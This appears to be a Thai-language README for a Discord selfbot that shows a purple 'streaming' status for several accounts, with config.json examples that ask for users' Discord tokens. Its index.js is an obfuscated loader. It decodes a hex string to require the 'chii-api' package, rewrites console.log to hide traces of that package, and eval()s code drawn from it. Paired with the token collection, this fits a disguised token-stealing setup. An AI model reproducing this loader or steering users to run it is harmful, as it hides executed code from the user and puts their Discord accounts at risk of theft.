# STATUS-Discord RichPresence Selfbot-V13 NodeJS-Module
+ 🟣Streaming status for Discord accounts
+ 🟣This code can make purple pill status unlimited for multiple accounts.

+ 🟣สถานะการสตรีมสำหรับบัญชี Discord
+ 🟣โค้ดนี้สามารถทำสถานะเม็ดม่วงได้หลายบัญชีไม่จำกัด
+ 🟣ออกแบบมาเพื่อปรับแต่งชื่อโดยไม่ต้องปิดโค้ดแล้วรันใหม่
+ 🟣สถานะจะอัปเดตให้อัตโนมัติเมื่อมีการอัพเดทชื่อต่างๆในไฟล์ comfig.json

## Installation
+ ติดตั้ง Modules
```sh
npm install chii-api
```
## Run Code
+ รันโค้ด
```sh
node index.js
```
+ How To Code index.js STATUS Discord RichPresence
+ วิธีการเขียนโค้ด index.js สถานะ Discord RichPresence

# สร้างไฟล์ชื่อ index.js
```js
function _0x458e(_0x3d7326, _0x3db6f8) {
    const _0xc3702a = _0xc370();
    return _0x458e = function (_0x458e36, _0x1257e2) {
        _0x458e36 = _0x458e36 - 0x1e1;
        let _0x4213e8 = _0xc3702a[_0x458e36];
        return _0x4213e8;
    }, _0x458e(_0x3d7326, _0x3db6f8);
}
function _0xc370() {
    const _0x3aa8ea = [
        '144FNwDVt', '3skqnTm', 'log', '1147004amDmiE', '2772360wixPWO'
        , '678573urizmr', '3252690NFEpLS', 'includes', 'hex', '7220WeTJyp'
        , 'from', 'apply', 'base64', '362900WJBULP', 'toString', 'Code\x20error'
        , '636869692d617069', '50314OSMzsz', 'string', 'utf8'
    ]; _0xc370 = function () { return _0x3aa8ea; };
    return _0xc370();
}
const _0x4057e9 = _0x458e;
(function (_0xeb9e0e, _0x1ca5c9) {
    const _0x3d002b = _0x458e, _0x26438d = _0xeb9e0e();
    while (!![]) {
        try {
            const _0x17c5ac = -parseInt(_0x3d002b(0x1e8)) / 0x1 + parseInt(_0x3d002b(0x1e4)) / 0x2 + -parseInt(_0x3d002b(0x1ec)) / 0x3 * (parseInt(_0x3d002b(0x1ee)) / 0x4) + -parseInt(_0x3d002b(0x1f4)) / 0x5 + -parseInt(_0x3d002b(0x1ef)) / 0x6 + -parseInt(_0x3d002b(0x1f1)) / 0x7 + parseInt(_0x3d002b(0x1eb)) / 0x8 * (parseInt(_0x3d002b(0x1f0)) / 0x9);
            if (_0x17c5ac === _0x1ca5c9)
                break;
            else _0x26438d['push'](_0x26438d['shift']());
        } catch (_0x3225c4) { _0x26438d['push'](_0x26438d['shift']()); }
    }
}(_0xc370, 0x42bcd)); const { log: originalLog } = require('console'), _0x5f44 = require(Buffer[_0x4057e9(0x1e1)](_0x4057e9(0x1e7), _0x4057e9(0x1f3))[_0x4057e9(0x1e5)](_0x4057e9(0x1ea))); console[_0x4057e9(0x1ed)] = function (_0x24bb19) {
    const _0x1cf85f = _0x4057e9;
    typeof _0x24bb19 === _0x1cf85f(0x1e9) && (_0x24bb19[_0x1cf85f(0x1f2)](_0x5f44) || _0x24bb19[_0x1cf85f(0x1f2)](Buffer[_0x1cf85f(0x1e1)](_0x5f44)[_0x1cf85f(0x1e5)](_0x1cf85f(0x1e3)))) ? originalLog(_0x1cf85f(0x1e6)) : originalLog[_0x1cf85f(0x1e2)](console, arguments);
};
const X1_ = Buffer['from'](_0x5f44)[_0x4057e9(0x1e5)]('base64'); eval(Buffer[_0x4057e9(0x1e1)](X1_, _0x4057e9(0x1e3))[_0x4057e9(0x1e5)](_0x4057e9(0x1ea)));
const K2_ = ![];
K2_ && console['log'](Buffer[_0x4057e9(0x1e1)](_0x5f44, _0x4057e9(0x1ea))[_0x4057e9(0x1e5)](_0x4057e9(0x1e3)));
```

# แพ็กเก็จเสร็ม package.json
```js
{
  "dependencies": {
    "chii-api": "^1.0.8"
  }
}
```

# การกำหนดชื่อสถานะสังเกตุที่ชื่อหัวข้อมัน
+ applicationId = "ไอดีของผู้ใช้งาน"
+ token = "โทเค็นผู้ใช้งาน"
+ setURL = "ลิงค์สตรีมมิ่ง https://twitch.tv/streamer"

+ Details = ["ชื่อด้านบนสุดหน้าแรก", "ชื่อด้านบนสุดหน้าสอง"]
+ setState = ["ชื่อตรงกลางหน้าแรก", "ชื่อตรงกลางหน้าสอง"]
+ LargeText = ["ชื่อด้านล่างสุดหน้าแรก", "ชื่อด้านล่างสุดหน้าสอง"]

+ largeImageLinks = ["ลิงค์รูปภาพใหญ่หน้าแรก", "ลิงค์รูปภาพใหญ่หน้าสอง"]
+ smallImageLinks = ["ลิงค์รูปภาพเล็กหน้าแรก", "ลิงค์รูปภาพเล็กหน้าสอง"]

+ button1 = "ชื่อปุ่มที่1"
+ link1 = "https://ลิงค์ปุ่มที่1"

+ button2 = "ชื่อปุ่มที่2"
+ link2 = "https://ลิงค์ปุ่มที่2"

# หยิบชื่อไปใช้ตั้งค่าสถานะใน config.json
+ เวลานาที ตัวอย่าง 10:10
```js
time:t
```
+ ปฎิทินวันที่ตัวเลขตัวอย่าง 10/10/2030
```js
date:n
```
+ ปฎิทินวันที่ภาษาไทยตัวอย่าง 10/มกราคม/2030
```js
date:th
```
+ แสดงปฎิทินวันที่ภาษาอังกฤษ 10/January/2030
```js
date:eg
```
+ แสดงวันของไทยตัวอย่าง จันทร์ อังคาร.....
```js
day:th
```
+ แสดงวันของอังกฤษตัวอย่าง 𝐒𝐮𝐧𝐝𝐚𝐲 𝐌𝐨𝐧𝐝𝐚𝐲.....
```js
day:eg
```
+ แสดงสถานะความปิงตัวอย่าง 200 km/s
```js
ping:ms
```
+ แสดงสถานะความร้อนตัวอย่าง 24 °C
```js
temp:c
```
+ แสดงสถานะแรมตัวอย่าง 32 GB
```js
ram:g
```
+ แสดงสถานะ CPU ตัวอย่าง 𝐂𝐏𝐔 𝐑𝐲𝐳𝐞𝐧 𝟓 𝟓𝟔𝟎𝟎𝐗 𝟑.𝟕 𝐆𝐇𝐳
```js
cpu:g
```

# ตัวอย่างวิธีหยิบกรอกชื่อให้มันสถานะต่าง
+ ในมุมมองมันจะแสดงผลแบบนี้ เวลา 10:10 วันที่ 10/10/2030
+ หากแต่งอักษรพิเศษใส่มันจะแสดงแบบนี้ 
꒰ เวลา 10:10 ꒱ ⚘ ꒰ 10/10/2030 ꒱

```js
เวลา: time:t วันที่: date:n 
```

# ไฟล์ทำสถานะเม็ดม่วง กำหนดเอาไว้ใน config.json
```js
{
    "user": [
        {
            "applicationId": "ไอดีผู้ใช้งาน",
            "token": "โทเค็นผู้ใช้งาน",
            "setURL": [
                "https://twitch.tv/chii"
            ],
            "Details": [
                "꒰ time:t ꒱ ✦ ꒰ date:n ꒱"
                , "꒰ time:t ꒱ ✦ ꒰ date:th ꒱"
                ,"꒰ วันday:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:n ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:th ꒱"
                ,"꒰ วันday:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
                ,"꒰ วันday:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
            ],
            "setState": [
                "【 𝟏 / 𝟏𝟎 】👒ꔛ☆★☆★☆★☆★ꔛ"
                ,"【 𝟐 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟑 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟒 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟓 / 𝟏𝟎 】👒ꔛ☆★☆★☆★☆★ꔛ"
                ,"【 𝟔 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟕 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟖 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟗 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟏𝟎 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
            ],
            "LargeText": [
                "⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
            ],
            "largeImageLinks": [
                "https://s11.gifyu.com/images/SoUrt.gif"
                ,"https://s11.gifyu.com/images/SoUtK.gif"
                ,"https://s11.gifyu.com/images/SoUrv.gif"
                ,"https://s11.gifyu.com/images/SoUtw.gif"
                ,"https://s11.gifyu.com/images/SoUrU.gif"
                ,"https://s11.gifyu.com/images/SoUDY.gif"
                ,"https://s11.gifyu.com/images/SoUrf.gif"
                ,"https://s11.gifyu.com/images/SoUrr.gif"
                ,"https://s11.gifyu.com/images/SoUr1.gif"
                ,"https://s11.gifyu.com/images/SoUrX.gif"
            ],
            "smallImageLinks": [
                "https://s11.gifyu.com/images/SoUrt.gif"
                ,"https://s11.gifyu.com/images/SoUtK.gif"
                ,"https://s11.gifyu.com/images/SoUrv.gif"
                ,"https://s11.gifyu.com/images/SoUtw.gif"
                ,"https://s11.gifyu.com/images/SoUrU.gif"
                ,"https://s11.gifyu.com/images/SoUDY.gif"
                ,"https://s11.gifyu.com/images/SoUrf.gif"
                ,"https://s11.gifyu.com/images/SoUrr.gif"
                ,"https://s11.gifyu.com/images/SoUr1.gif"
                ,"https://s11.gifyu.com/images/SoUrX.gif"
            ],
            "button1": "button1",
            "link1": "https://discord.gg/5gAsw4Pawq",
            "button2": "button2",
            "link2": "https://discord.gg/5gAsw4Pawq"
        }
    ]
}
```




# ไฟล์ทำสถานะเม็ดม่วง กำหนดทำกับเพื่อนเพิ่มอีก
```js
{
    "user": [
        {
            "applicationId": "ไอดีผู้ใช้งานคนที่ 1",
            "token": "โทเค็นผู้ใช้งานคนที่ 1",
            "setURL": [
                "https://twitch.tv/chii"
            ],
            "Details": [
                "꒰ time:t ꒱ ✦ ꒰ date:n ꒱"
                , "꒰ time:t ꒱ ✦ ꒰ date:th ꒱"
                ,"꒰ วันday:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:n ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:th ꒱"
                ,"꒰ วันday:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
                ,"꒰ วันday:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
            ],
            "setState": [
                "【 𝟏 / 𝟏𝟎 】👒ꔛ☆★☆★☆★☆★ꔛ"
                ,"【 𝟐 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟑 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟒 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟓 / 𝟏𝟎 】👒ꔛ☆★☆★☆★☆★ꔛ"
                ,"【 𝟔 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟕 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟖 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟗 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟏𝟎 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
            ],
            "LargeText": [
                "⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
            ],
            "largeImageLinks": [
                "https://s11.gifyu.com/images/SoUrt.gif"
                ,"https://s11.gifyu.com/images/SoUtK.gif"
                ,"https://s11.gifyu.com/images/SoUrv.gif"
                ,"https://s11.gifyu.com/images/SoUtw.gif"
                ,"https://s11.gifyu.com/images/SoUrU.gif"
                ,"https://s11.gifyu.com/images/SoUDY.gif"
                ,"https://s11.gifyu.com/images/SoUrf.gif"
                ,"https://s11.gifyu.com/images/SoUrr.gif"
                ,"https://s11.gifyu.com/images/SoUr1.gif"
                ,"https://s11.gifyu.com/images/SoUrX.gif"
            ],
            "smallImageLinks": [
                "https://s11.gifyu.com/images/SoUrt.gif"
                ,"https://s11.gifyu.com/images/SoUtK.gif"
                ,"https://s11.gifyu.com/images/SoUrv.gif"
                ,"https://s11.gifyu.com/images/SoUtw.gif"
                ,"https://s11.gifyu.com/images/SoUrU.gif"
                ,"https://s11.gifyu.com/images/SoUDY.gif"
                ,"https://s11.gifyu.com/images/SoUrf.gif"
                ,"https://s11.gifyu.com/images/SoUrr.gif"
                ,"https://s11.gifyu.com/images/SoUr1.gif"
                ,"https://s11.gifyu.com/images/SoUrX.gif"
            ],
            "button1": "button1",
            "link1": "https://discord.gg/5gAsw4Pawq",
            "button2": "button2",
            "link2": "https://discord.gg/5gAsw4Pawq"
        },
        {
            "applicationId": "ไอดีผู้ใช้งานคนที่ 2",
            "token": "โทเค็นผู้ใช้งานคนที่ 2",
            "setURL": [
                "https://twitch.tv/chii"
            ],
            "Details": [
                "꒰ time:t ꒱ ✦ ꒰ date:n ꒱"
                , "꒰ time:t ꒱ ✦ ꒰ date:th ꒱"
                ,"꒰ วันday:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:n ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:th ꒱"
                ,"꒰ วันday:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
                ,"꒰ วันday:th ꒱ ✦ ꒰ day:eg ꒱"
                ,"꒰ time:t ꒱ ✦ ꒰ date:eg ꒱"
            ],
            "setState": [
                "【 𝟏 / 𝟏𝟎 】👒ꔛ☆★☆★☆★☆★ꔛ"
                ,"【 𝟐 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟑 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟒 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟓 / 𝟏𝟎 】👒ꔛ☆★☆★☆★☆★ꔛ"
                ,"【 𝟔 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟕 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟖 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
                ,"【 𝟗 / 𝟏𝟎 】👒ꔛ☆☆★☆★☆★★ꔛ"
                ,"【 𝟏𝟎 / 𝟏𝟎 】👒ꔛ★☆★☆★☆★☆ꔛ"
            ],
            "LargeText": [
                "⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
                ,"⋆꒰ 🌡️ temp:c °𝐂 ꒱ εїз ꒰🍃 ping:ms 𝗸𝗺/𝘀 ꒱⋆"
            ],
            "largeImageLinks": [
                "https://s11.gifyu.com/images/SoUrt.gif"
                ,"https://s11.gifyu.com/images/SoUtK.gif"
                ,"https://s11.gifyu.com/images/SoUrv.gif"
                ,"https://s11.gifyu.com/images/SoUtw.gif"
                ,"https://s11.gifyu.com/images/SoUrU.gif"
                ,"https://s11.gifyu.com/images/SoUDY.gif"
                ,"https://s11.gifyu.com/images/SoUrf.gif"
                ,"https://s11.gifyu.com/images/SoUrr.gif"
                ,"https://s11.gifyu.com/images/SoUr1.gif"
                ,"https://s11.gifyu.com/images/SoUrX.gif"
            ],
            "smallImageLinks": [
                "https://s11.gifyu.com/images/SoUrt.gif"
                ,"https://s11.gifyu.com/images/SoUtK.gif"
                ,"https://s11.gifyu.com/images/SoUrv.gif"
                ,"https://s11.gifyu.com/images/SoUtw.gif"
                ,"https://s11.gifyu.com/images/SoUrU.gif"
                ,"https://s11.gifyu.com/images/SoUDY.gif"
                ,"https://s11.gifyu.com/images/SoUrf.gif"
                ,"https://s11.gifyu.com/images/SoUrr.gif"
                ,"https://s11.gifyu.com/images/SoUr1.gif"
                ,"https://s11.gifyu.com/images/SoUrX.gif"
            ],
            "button1": "button1",
            "link1": "https://discord.gg/5gAsw4Pawq",
            "button2": "button2",
            "link2": "https://discord.gg/5gAsw4Pawq"
        }
    ]
}
```


# ผู้พัฒนาโค้ดสตรีมมิ่ง By Developer : CHII แอดมินซี
+ เซิร์ฟเวอร์ Discord https://discord.gg/5gAsw4Pawq
